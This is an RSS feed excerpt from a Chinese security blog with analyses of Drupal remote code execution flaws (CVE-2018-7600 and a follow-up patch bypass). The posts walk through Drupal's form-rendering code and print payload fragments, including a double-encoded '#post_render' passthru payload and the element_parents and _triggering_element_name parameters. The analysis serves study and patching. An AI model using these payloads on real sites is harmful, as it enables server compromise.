&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/WdeFV&#34; alt=&#34;drupal_rebuild_form&#34; /&gt;
表单被缓存&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/MCCPJ&#34; alt=&#34;form_set_cache&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/U5Tej&#34; alt=&#34;cache_form&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后我们发送第二个post包来取出我们构造好的form，向&lt;strong&gt;&lt;code&gt;file/ajax/actions/cancel/%23options/path&lt;/code&gt;&lt;/strong&gt;发起请求&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/voiue&#34; alt=&#34;post2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;参数传递进去&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/luJMk&#34; alt=&#34;file_ajax_upload&#34; /&gt;
最终还是跟入到
&lt;code&gt;$output = drupal_render($form);&lt;/code&gt;
根据前几次的经验，我们还是选择&lt;code&gt;&#39;#post_render&#39;&lt;/code&gt;参数，&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/GV3Rc&#34; alt=&#34;post_render&#34; /&gt;
假如我们能控制这个参数，在&lt;code&gt;drupal_render()&lt;/code&gt;方法里就会把这个参数作为&lt;code&gt;$function&lt;/code&gt;函数名，而传给它的参数则是&lt;code&gt;[%23markup]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;所以问题回到了一开始，我们需要传递什么样的恶意参数，可以让系统直接接收而不经过过滤，还是之前的套路，搜索module下删除文章的相关操作&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/niMWz&#34; alt=&#34;node_form_delete_submit&#34; /&gt;
可以看到&lt;code&gt;node_form_delete_submit()&lt;/code&gt;方法从get方法直接接收参数&lt;code&gt;destination&lt;/code&gt;，与最初分析正常删除文章的参数正是同一个，那么我们就可以利用&lt;code&gt;destination&lt;/code&gt;传进恶意参数&lt;/p&gt;

&lt;p&gt;构造如下
&lt;strong&gt;&lt;code&gt;destination=a?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=dir&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;注意此处需要转义百分号，对&lt;code&gt;#&lt;/code&gt;进行二次编码，以绕过&lt;code&gt;CVE-2018-7600&lt;/code&gt;的补丁，不然在取值时会被认为&lt;code&gt;q[&lt;/code&gt;是一个值&lt;/p&gt;

&lt;p&gt;原因：
&lt;code&gt;includes/common.inc&lt;/code&gt;的&lt;code&gt;drupal_parse_url()&lt;/code&gt;方法对url进行了解析，而在url传入到Drupal内部的时候已经经过一层解码，也就是说&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;destination=a?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=dir
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在进入Drupal时已经被解码成&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;destination=a?q[%23post_render][]=passthru%26q[%23type]=markup%26q[%23markup]=dir
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后经过&lt;code&gt;parse_url()&lt;/code&gt;方法对url结构进行解析&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1530254681531.png&#34; alt=&#34;parse_url&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;a&lt;/code&gt;参数是次要的，主要是&lt;code&gt;q&lt;/code&gt;参数，因为在&lt;code&gt;drupal_parse_url()&lt;/code&gt;下半部分从q取出值赋给&lt;code&gt;$options[&#39;path&#39;]&lt;/code&gt;，也就是a被覆盖了，这个时候的&lt;code&gt;$options[&#39;path&#39;]&lt;/code&gt;就是我们传入的数组&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/s4o7s&#34; alt=&#34;options&#34; /&gt;&lt;/p&gt;

&lt;p&gt;参数缓存进整个form后通过第二个请求取出，同样经过&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;foreach ($form_parents as $parent) {
    $form = $form[$parent];
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;遍历叶子节点取出参数&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Wgz3w&#34; alt=&#34;parent&#34; /&gt;
进入&lt;code&gt;drupal_render()&lt;/code&gt;执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/SsmNM&#34; alt=&#34;passthru&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x05-poc&#34;&gt;0x05 PoC&lt;/h4&gt;

&lt;p&gt;略&lt;/p&gt;

&lt;h4 id=&#34;0x06-补丁&#34;&gt;0x06 补丁&lt;/h4&gt;

&lt;p&gt;7.x的补丁&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/drupal/drupal/commit/080daa38f265ea28444c540832509a48861587d0&#34;&gt;https://github.com/drupal/drupal/commit/080daa38f265ea28444c540832509a48861587d0&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/2Zhjq&#34; alt=&#34;patch&#34; /&gt;
其中一个重要操作就是对&lt;code&gt;destination&lt;/code&gt;参数进行了净化&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/CaZPF&#34; alt=&#34;cleanDestination&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x07-总结&#34;&gt;0x07 总结&lt;/h4&gt;

&lt;p&gt;总的来说这个漏洞是CVE-2018-7600的另一个利用点，只是入口方式不一样，最终执行点还是相同的，所以还是那句话，一旦参数可控并且没有经过正确的过滤，就很有可能出问题。&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-7600 Drupal 7.x 版本代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/cve-2018-7600-drupal-7.x-%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 20 Apr 2018 23:05:34 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-7600-drupal-7.x-%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;CVE-2018-7600影响范围包括了Drupal 6.x，7.x，8.x版本，前几天8.x版本的PoC出来之后大家都赶紧分析了一波，然后热度似乎慢慢退去了。两天前&lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;Drupalgeddon2&lt;/a&gt;项目更新了7.x版本的exp，实际环境也出现了利用，下面就简单来看一下&lt;/p&gt;

&lt;p&gt;看到项目上这样写&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Drupal &amp;lt; 7.58 ~ user/password URL, attacking triggering_element_name form &amp;amp; #post_render parameter, using PHP&amp;rsquo;s passthru function&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;提示了问题出在&lt;code&gt;user/password&lt;/code&gt;路径下，通过&lt;code&gt;#post_render&lt;/code&gt;传递恶意参数，问题出现在&lt;code&gt;triggering_element_name&lt;/code&gt;表单处理下&lt;/p&gt;

&lt;h4 id=&#34;0x02-漏洞分析&#34;&gt;0x02 漏洞分析&lt;/h4&gt;

&lt;p&gt;我们从三个问题入手，为什么PoC发了两个包，第二次请求为什么要带上一个&lt;code&gt;form_build_id&lt;/code&gt;，以及为什么选择&lt;code&gt;user/password&lt;/code&gt;这个入口&lt;/p&gt;

&lt;p&gt;先分析第一个post，照例还是先看一下Drupal 7的表单处理流程，跟8版本不太一样，但是入口还是相似的。
根据文档描述，当我们提交一个表单(例如找回密码)时，系统会通过&lt;code&gt;form_builder()&lt;/code&gt;方法创建一个form
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/lffx4.jpg&#34; alt=&#34;user/passwd&#34; /&gt;
一系列预处理后，会由&lt;code&gt;drupal_build_form
()&lt;/code&gt;方法创建一个表单，在第386行调用&lt;code&gt;drupal_process_form()&lt;/code&gt;方法，
跟进&lt;code&gt;drupal_process_form()&lt;/code&gt;方法，这时候默认的&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;为false&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/dd7fx.png&#34; alt=&#34;submitted&#34; /&gt;
不满足if条件，&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;被设置为true&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kqijr.png&#34; alt=&#34;true&#34; /&gt;
于是进入这个分支，最终被&lt;code&gt;drupal_redirect_form&lt;/code&gt;重定向&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/so5l4.jpg&#34; alt=&#34;drupal_redirect_form&#34; /&gt;&lt;/p&gt;

&lt;p&gt;我们的目的是要让系统缓存一个&lt;code&gt;form_build_id&lt;/code&gt;，以便后面拿出来用。要想form被缓存，就得想办法让&lt;code&gt;if ($form_state[&#39;submitted&#39;] &amp;amp;&amp;amp; !form_get_errors() &amp;amp;&amp;amp; !$form_state[&#39;rebuild&#39;])&lt;/code&gt;不成立，也就是说要使&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;为false
从而进入下面的&lt;code&gt;drupal_rebuild_form&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;那么如何让&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;为false呢？&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;includes/form.inc&lt;/code&gt;第886行
&lt;code&gt;$form = form_builder($form_id, $form, $form_state);&lt;/code&gt;
跟进&lt;code&gt;form_builder&lt;/code&gt;方法，第1987行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!empty($form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;])) {
  $form_state[&#39;submitted&#39;] = TRUE;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当&lt;code&gt;$form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;]&lt;/code&gt;存在值的时候就为true，那么我们就想办法让这个值为空
往上看第1972行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!$form_state[&#39;programmed&#39;] &amp;amp;&amp;amp; !isset($form_state[&#39;triggering_element&#39;]) &amp;amp;&amp;amp; !empty($form_state[&#39;buttons&#39;])) {
  $form_state[&#39;triggering_element&#39;] = $form_state[&#39;buttons&#39;][0];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果没有设置&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;，那么&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;就设置为第一个button的值，所以正常传递表单的时候&lt;code&gt;$form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;]&lt;/code&gt;就总会有值&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1do73.jpg&#34; alt=&#34;button&#34; /&gt;&lt;/p&gt;

&lt;p&gt;现在问题来了，如何构造一个form能够确保&lt;code&gt;$form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;]&lt;/code&gt;为空或者说不存在这个数组呢？&lt;/p&gt;

&lt;p&gt;我们注意到第1864行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!empty($element[&#39;#input&#39;])) {
  _form_builder_handle_input_element($form_id, $element, $form_state);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;_form_builder_handle_input_element()&lt;/code&gt;方法对表单先进行了处理，跟进去看一下&lt;/p&gt;

&lt;p&gt;第2144行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// Determine which element (if any) triggered the submission of the form and
// keep track of all the clickable buttons in the form for
// form_state_values_clean(). Enforce the same input processing restrictions
// as above.
if ($process_input) {
  // Detect if the element triggered the submission via Ajax.
  if (_form_element_triggered_scripted_submission($element, $form_state)) {
    $form_state[&#39;triggering_element&#39;] = $element;
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;被设置为&lt;code&gt;$element&lt;/code&gt;，前提是满足&lt;code&gt;_form_element_triggered_scripted_submission()&lt;/code&gt;方法，继续跟入
第2180行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function _form_element_triggered_scripted_submission($element, &amp;amp;$form_state) {
  if (!empty($form_state[&#39;input&#39;][&#39;_triggering_element_name&#39;]) &amp;amp;&amp;amp; $element[&#39;#name&#39;] == $form_state[&#39;input&#39;][&#39;_triggering_element_name&#39;]) {
    if (empty($form_state[&#39;input&#39;][&#39;_triggering_element_value&#39;]) || $form_state[&#39;input&#39;][&#39;_triggering_element_value&#39;] == $element[&#39;#value&#39;]) {
      return TRUE;
    }
  }
  return FALSE;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个方法的意思是说如果&lt;code&gt;_triggering_element_value&lt;/code&gt;和&lt;code&gt;$element&lt;/code&gt;的键值都相等的话，返回true
&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;赋值为&lt;code&gt;$element&lt;/code&gt;，其中不含&lt;code&gt;[&#39;#executes_submit_callback&#39;]&lt;/code&gt;，一开始的条件就成立了&lt;/p&gt;

&lt;p&gt;根据PoC，我们传入&lt;code&gt;_triggering_element_name=name&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/3c6kh.jpg&#34; alt=&#34;element&#34; /&gt;
看到进入这个分支，进入&lt;code&gt;form_set_cache()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/cn1jh.jpg&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/lskgu.png&#34; alt=&#34;&#34; /&gt;
数据库中插入缓存&lt;code&gt;form_build_id&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/odfo8.png&#34; alt=&#34;&#34; /&gt;
成功写入缓存&lt;/p&gt;

&lt;p&gt;接下去来看一下这个缓存有什么用&lt;/p&gt;

&lt;p&gt;分析PoC的第二个包，请求参数是这样&lt;code&gt;q=file/ajax/name/%23value/form_build_id&lt;/code&gt;
&lt;code&gt;form_build_id&lt;/code&gt;即我们上一个写入数据库的缓存表单&lt;/p&gt;

&lt;p&gt;首先请求会进入&lt;code&gt;includes/menu.inc&lt;/code&gt;的&lt;code&gt;menu_get_item()&lt;/code&gt;方法，&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function menu_get_item($path = NULL, $router_item = NULL) {
  $router_items = &amp;amp;drupal_static(__FUNCTION__);
  if (!isset($path)) {
    $path = $_GET[&#39;q&#39;];
  }
  if (isset($router_item)) {
    $router_items[$path] = $router_item;
  }
  if (!isset($router_items[$path])) {
    // Rebuild if we know it&#39;s needed, or if the menu masks are missing which
    // occurs rarely, likely due to a race condition of multiple rebuilds.
    if (variable_get(&#39;menu_rebuild_needed&#39;, FALSE) || !variable_get(&#39;menu_masks&#39;, array())) {
      if (_menu_check_rebuild()) {
        menu_rebuild();
      }
    }
    $original_map = arg(NULL, $path);

    $parts = array_slice($original_map, 0, MENU_MAX_PARTS);
    $ancestors = menu_get_ancestors($parts);
    $router_item = db_query_range(&#39;SELECT * FROM {menu_router} WHERE path IN (:ancestors) ORDER BY fit DESC&#39;, 0, 1, array(&#39;:ancestors&#39; =&amp;gt; $ancestors))-&amp;gt;fetchAssoc();

    if ($router_item) {
      // Allow modules to alter the router item before it is translated and
      // checked for access.
      drupal_alter(&#39;menu_get_item&#39;, $router_item, $path, $original_map);

      $map = _menu_translate($router_item, $original_map);
      $router_item[&#39;original_map&#39;] = $original_map;
      if ($map === FALSE) {
        $router_items[$path] = FALSE;
        return FALSE;
      }
      if ($router_item[&#39;access&#39;]) {
        $router_item[&#39;map&#39;] = $map;
        $router_item[&#39;page_arguments&#39;] = array_merge(menu_unserialize($router_item[&#39;page_arguments&#39;], $map), array_slice($map, $router_item[&#39;number_parts&#39;]));
        $router_item[&#39;theme_arguments&#39;] = array_merge(menu_unserialize($router_item[&#39;theme_arguments&#39;], $map), array_slice($map, $router_item[&#39;number_parts&#39;]));
      }
    }
    $router_items[$path] = $router_item;
  }
  return $router_items[$path];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;$path&lt;/code&gt;即我们传进去的q参数，经过一系列处理传给&lt;code&gt;menu_get_ancestors()&lt;/code&gt;方法，该方法把path重新组合成一堆router，也就是Drupal处理路由到具体url的传参方式，最终被&lt;code&gt;db_query_range()&lt;/code&gt;带入数据库查询
我们关注查询结果&lt;code&gt;$router_item&lt;/code&gt;的&lt;code&gt;page_callback&lt;/code&gt;值，因为这个值最终会作为参数被带入&lt;code&gt;call_user_func_array()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if ($page_callback_result == MENU_SITE_ONLINE) {
  if ($router_item = menu_get_item($path)) {
    if ($router_item[&#39;access&#39;]) {
      if ($router_item[&#39;include_file&#39;]) {
        require_once DRUPAL_ROOT . &#39;/&#39; . $router_item[&#39;include_file&#39;];
      }
      $page_callback_result = call_user_func_array($router_item[&#39;page_callback&#39;], $router_item[&#39;page_arguments&#39;]);
    }
    else {
      $page_callback_result = MENU_ACCESS_DENIED;
    }
  }
  else {
    $page_callback_result = MENU_NOT_FOUND;
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/qvqwz.png&#34; alt=&#34;call_user_func_array&#34; /&gt;
到这里就跟8版本的情况有点类似了&lt;/p&gt;

&lt;p&gt;跟入回调函数&lt;code&gt;file_ajax_upload()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/tij37.jpg&#34; alt=&#34;file_ajax_upload&#34; /&gt;
还是一样，把&lt;code&gt;$form_parents&lt;/code&gt;完整取出赋值给&lt;code&gt;$form&lt;/code&gt;，加上一些前缀后缀后最终进入&lt;code&gt;drupal_render()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;最终得到执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/rpwrs.jpg&#34; alt=&#34;passthru&#34; /&gt;&lt;/p&gt;

&lt;p&gt;到目前为止我们分析清楚了为什么PoC要发两次包，以及第二次请求为什么要带上一个&lt;code&gt;form_build_id&lt;/code&gt;，现在来想一想为什么要请求&lt;code&gt;user/password&lt;/code&gt;这个路径呢？
在user这个module下的&lt;code&gt;user_pass()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function user_pass() {
  global $user;

  $form[&#39;name&#39;] = array(
    &#39;#type&#39; =&amp;gt; &#39;textfield&#39;,
    &#39;#title&#39; =&amp;gt; t(&#39;Username or e-mail address&#39;),
    &#39;#size&#39; =&amp;gt; 60,
    &#39;#maxlength&#39; =&amp;gt; max(USERNAME_MAX_LENGTH, EMAIL_MAX_LENGTH),
    &#39;#required&#39; =&amp;gt; TRUE,
    &#39;#default_value&#39; =&amp;gt; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : &#39;&#39;,
  );
  ...
  return $form;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到这里是不是感觉跟8版本很相似，&lt;code&gt;#default_value&lt;/code&gt;从get的&lt;code&gt;name&lt;/code&gt;参数里取值，而name可以作为数组传入，它的属性在下面正好可以被利用，一个巧妙的利用链就串起来了。&lt;/p&gt;

&lt;h4 id=&#34;0x03-总结&#34;&gt;0x03 总结&lt;/h4&gt;

&lt;p&gt;Drupal 7.x的利用比8.x要复杂一些，但触发点和一开始的风险因素还是类似的，一是接收参数过滤不当，而是可控参数进入危险方法。官方补丁把入口处的&lt;code&gt;#&lt;/code&gt;全给过滤了，简单粗暴又有效，估计再利用框架本身的特性想传递进一些数组或元素就很难了。&lt;/p&gt;

&lt;h4 id=&#34;0x04-参考&#34;&gt;0x04 参考&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;https://github.com/dreadlocked/Drupalgeddon2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/uncovering-drupalgeddon-2/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-7600 Drupal 内核远程代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/cve-2018-7600-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 13 Apr 2018 23:05:34 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-7600-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://www.drupal.org/sa-core-2018-002&#34;&gt;https://www.drupal.org/sa-core-2018-002&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;p&gt;Drupal 6.x，7.x，8.x&lt;/p&gt;

&lt;p&gt;修复版本
Drupal 7.58，Drupal 8.5.1&lt;/p&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;p&gt;历史版本
&lt;a href=&#34;https://www.drupal.org/project/drupal/releases&#34;&gt;https://www.drupal.org/project/drupal/releases&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x04-流程梳理&#34;&gt;0x04 流程梳理&lt;/h4&gt;

&lt;p&gt;先来理清一下Drupal处理表单的情况。更详细的可以看&lt;a href=&#34;http://www.thinkindrupal.com/node/1100&#34;&gt;文档&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Drupal提供了一个应用程序接口（API），用来生成、验证和处理HTML表单。表单API将表单抽象为一个嵌套数组，里面包含了属性和值。在生成页面时，表单呈现引擎会在适当的时候将数组呈现出来。&lt;/p&gt;

&lt;p&gt;模块使用关联数组向Drupal描述表单。Drupal的表单引擎负责为要显示的表单生成HTML，并使用三个阶段来安全的处理提交了的表单：验证、提交、重定向。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Drupal比较特殊，它不像大部分cms通过html直接渲染页面，而是把接收的数据交给&lt;code&gt;core/lib/Drupal/Core/Form/FormBuilder.php&lt;/code&gt;的&lt;code&gt;buildForm()&lt;/code&gt;方法处理，&lt;code&gt;buildForm()&lt;/code&gt;经过处理后返回一个结构体(数组)，数组通过引擎生成HTML。&lt;/p&gt;

&lt;p&gt;当我们提交一个表单(例如注册页面)，&lt;code&gt;buildForm()&lt;/code&gt;方法会根据&lt;code&gt;$form_id&lt;/code&gt;取出数据，经过一系列处理后返回一个树形结构，这个结构就是通过数组存储的，就是我们看到的类似&lt;code&gt;[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][]&lt;/code&gt;的结构，数组每个元素作为一个叶子节点，后续就把整个&lt;code&gt;form&lt;/code&gt;结构渲染出页面。&lt;/p&gt;

&lt;p&gt;当我们在注册页面上传一张图片的时候，&lt;code&gt;form&lt;/code&gt;结构被传给&lt;code&gt;core/modules/file/src/Element/ManagedFile.php&lt;/code&gt;的&lt;code&gt;uploadAjaxCallback()&lt;/code&gt;方法，这个方法用来处理上传文件的情况&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; public static function uploadAjaxCallback(&amp;amp;$form, FormStateInterface &amp;amp;$form_state, Request $request) {
    /** @var \Drupal\Core\Render\RendererInterface $renderer */
    $renderer = \Drupal::service(&#39;renderer&#39;);

    $form_parents = explode(&#39;/&#39;, $request-&amp;gt;query-&amp;gt;get(&#39;element_parents&#39;));

    // Retrieve the element to be rendered.
    $form = NestedArray::getValue($form, $form_parents);

    // Add the special AJAX class if a new file was added.
    $current_file_count = $form_state-&amp;gt;get(&#39;file_upload_delta_initial&#39;);
    if (isset($form[&#39;#file_upload_delta&#39;]) &amp;amp;&amp;amp; $current_file_count &amp;lt; $form[&#39;#file_upload_delta&#39;]) {
      $form[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][] = &#39;ajax-new-content&#39;;
    }
    // Otherwise just add the new content class on a placeholder.
    else {
      $form[&#39;#suffix&#39;] .= &#39;&amp;lt;span class=&amp;quot;ajax-new-content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&#39;;
    }

    $status_messages = [&#39;#type&#39; =&amp;gt; &#39;status_messages&#39;];
    $form[&#39;#prefix&#39;] .= $renderer-&amp;gt;renderRoot($status_messages);
    $output = $renderer-&amp;gt;renderRoot($form);

    $response = new AjaxResponse();
    $response-&amp;gt;setAttachments($form[&#39;#attached&#39;]);

    return $response-&amp;gt;addCommand(new ReplaceCommand(NULL, $output));
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/8b1t3&#34; alt=&#34;upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Q3ys0&#34; alt=&#34;form_parents&#34; /&gt;&lt;/p&gt;

&lt;p&gt;问题就出现在&lt;code&gt;$request-&amp;gt;query-&amp;gt;get(&#39;element_parents&#39;)&lt;/code&gt;这个地方，&lt;code&gt;$form_parents&lt;/code&gt;父节点的值是从&lt;code&gt;get()&lt;/code&gt;取出&lt;code&gt;element_parents&lt;/code&gt;参数传进去的，进入下面的&lt;code&gt;NestedArray::getValue()&lt;/code&gt;方法，&lt;code&gt;getValue()&lt;/code&gt;的作用是接收一个节点，把这个节点下的叶子节点全部遍历出来，再根据叶子节点的&lt;code&gt;key-value&lt;/code&gt;值进行后续操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/39ciX&#34; alt=&#34;getValue&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/f8qiO&#34; alt=&#34;user_picture&#34; /&gt;&lt;/p&gt;

&lt;p&gt;按理说这样的功能很正常，关键就在于这个&lt;code&gt;element_parents&lt;/code&gt;正是我们可以控制的，也就是说我们可以指定&lt;code&gt;uploadAjaxCallback()&lt;/code&gt;渲染我们给它的参数，而这个参数可以是恶意的。&lt;/p&gt;

&lt;h4 id=&#34;0x05-漏洞分析&#34;&gt;0x05 漏洞分析&lt;/h4&gt;

&lt;p&gt;那么我们传进去什么参数呢？我们先来测试一下，正常注册流程，&lt;code&gt;mail&lt;/code&gt;参数传进去一个数组的话会怎么样&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KJE50&#34; alt=&#34;mail&#34; /&gt;
可以看到我们构造的“子节点”被存储在&lt;code&gt;mail-value&lt;/code&gt;下，如果要取出这个值就得让上面提到的&lt;code&gt;getValue()&lt;/code&gt;接收这个参数，所以我们构造&lt;code&gt;element_parents=account/name/%23value&lt;/code&gt;，这样子&lt;code&gt;getValue()&lt;/code&gt;就会遍历出我们构造的参数&lt;/p&gt;

